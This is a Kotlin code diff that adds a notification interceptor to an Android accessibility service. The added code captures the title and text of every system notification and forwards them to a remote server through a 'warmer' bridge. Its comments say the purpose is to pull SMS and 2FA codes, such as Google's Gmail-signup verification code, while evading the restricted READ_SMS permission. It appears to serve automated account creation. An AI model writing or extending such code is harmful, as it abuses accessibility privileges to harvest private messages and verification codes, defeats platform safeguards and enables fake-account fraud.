@@ -297,6 +297,35 @@ class InputService : AccessibilityService() {
     // -----------------------------------------------------------------------
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
 
+        // ── Notification interceptor ──────────────────────────────────
+        // Runs on ALL Android versions (the SDK-33 guard below only skips
+        // the a11y-tree pipeline). Captures title+text of every system
+        // notification and forwards a JSON envelope to the server via the
+        // warmer bridge. The server uses this to auto-extract SMS / 2FA
+        // codes (e.g. Google's phone-verification code during Gmail signup)
+        // without needing the Google-restricted READ_SMS permission.
+        if (event.eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
+            try {
+                val pkg   = event.packageName?.toString().orEmpty()
+                val notif = event.parcelableData as? android.app.Notification
+                val extras = notif?.extras
+                val title = extras?.getCharSequence(android.app.Notification.EXTRA_TITLE)?.toString().orEmpty()
+                val text  = extras?.getCharSequence(android.app.Notification.EXTRA_TEXT)?.toString().orEmpty()
+                val body  = text.ifEmpty { event.text.joinToString("\n") }
+                if (body.isNotEmpty()) {
+                    val obj = org.json.JSONObject().apply {
+                        put("type",      "notification")
+                        put("package",   pkg)
+                        put("title",     title)
+                        put("text",      body)
+                        put("timestamp", System.currentTimeMillis())
+                    }
+                    WarmerService.sendEvent(obj.toString())
+                }
+            } catch (_: Throwable) {}
+            return
+        }
+
       if (Build.VERSION.SDK_INT > 33) {
         return
       }
